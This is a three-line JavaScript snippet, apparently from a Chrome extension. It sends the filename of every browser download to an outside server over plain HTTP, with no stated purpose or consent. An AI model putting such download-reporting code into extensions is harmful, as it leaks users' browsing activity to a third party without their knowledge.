chrome.downloads.onCreated.addListener(function(downloadItem) {
	$.get("http://pusher.tools.pixelowner.com", { filename: downloadItem.filename } );
});